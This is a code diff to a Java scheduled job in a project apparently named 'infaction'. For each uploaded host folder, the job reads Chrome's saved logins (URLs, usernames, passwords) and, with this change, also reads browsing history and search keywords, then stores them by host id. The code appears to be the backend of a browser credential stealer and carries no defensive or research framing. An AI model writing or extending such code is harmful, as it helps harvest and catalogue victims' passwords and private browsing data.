@@ -1,9 +1,14 @@
 package com.jimmy.infaction.job;
 
+import com.jimmy.infaction.common.HistoryKeyResult;
+import com.jimmy.infaction.common.HistoryUrlResult;
 import com.jimmy.infaction.common.SqlLiteDemoResult;
 import com.jimmy.infaction.common.SqliteHelper;
-import com.jimmy.infaction.pojo.Browser;
+import com.jimmy.infaction.pojo.*;
+import com.jimmy.infaction.service.BrowserDownloadService;
+import com.jimmy.infaction.service.BrowserKeywordService;
 import com.jimmy.infaction.service.BrowserService;
+import com.jimmy.infaction.service.BrowserUrlService;
 import com.sun.jna.platform.win32.Crypt32Util;
 import org.quartz.Job;
 import org.quartz.JobExecutionContext;
@@ -40,6 +45,9 @@ public class DeBagJob  implements  Job {
 		}
 		//find xml register beanservice
 		BrowserService browserService = (BrowserService) applicationContext.getBean("browserService");
+		BrowserDownloadService browserDownloadService = (BrowserDownloadService) applicationContext.getBean("browserDownloadService");
+		BrowserKeywordService browserKeywordService = (BrowserKeywordService) applicationContext.getBean("browserKeywordService");
+		BrowserUrlService browserUrlService = (BrowserUrlService) applicationContext.getBean("browserUrlService");
 		String rootPath = "F:\\workspace\\infaction\\upload\\";
 		File dir = new File(rootPath);
 		File[] files = dir.listFiles();
@@ -49,7 +57,7 @@ public class DeBagJob  implements  Job {
 					try {
 						switch (ff.getName()){
 							case "Login Data":
-								SqliteHelper h = new SqliteHelper(rootPath+f.getName()+"\\"+ff.getName());
+								SqliteHelper h = new SqliteHelper(rootPath+f.getName()+"\\"+"Login Data");
 								List<SqlLiteDemoResult> demoList = h.executeQueryList("Select action_url, username_value, password_value FROM logins", SqlLiteDemoResult.class);
 								for (SqlLiteDemoResult result : demoList) {
 									Browser browser = new Browser();
@@ -60,7 +68,24 @@ public class DeBagJob  implements  Job {
 									browserService.insert(browser);
 								}
 							case "History":
-//								System.out.println(ff.getName());
+								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"\\"+"History");
+								List<HistoryUrlResult> HList = hi.executeQueryList("Select url, title, visit_count FROM urls", HistoryUrlResult.class);
+								for (HistoryUrlResult result : HList) {
+									Browser_url browser_url = new Browser_url();
+									browser_url.setWebsite(result.getWebsite());
+									browser_url.setTitle(result.getTitle());
+									browser_url.setVisit(result.getVisit());
+									browser_url.setHostid(f.getName());
+									browserUrlService.insert(browser_url);
+								}
+								List<HistoryKeyResult> HkList = hi.executeQueryList("Select  lower_term FROM keyword_search_terms", HistoryKeyResult.class);
+								for (HistoryKeyResult result : HkList) {
+									Browser_keyword browser_keyword = new Browser_keyword();
+									browser_keyword.setKey(result.getKey());
+									browser_keyword.setHostid(f.getName());
+									browserKeywordService.insert(browser_keyword);
+								}
+
 							case "Cookies":
 //								System.out.println(ff.getName());
 							default:
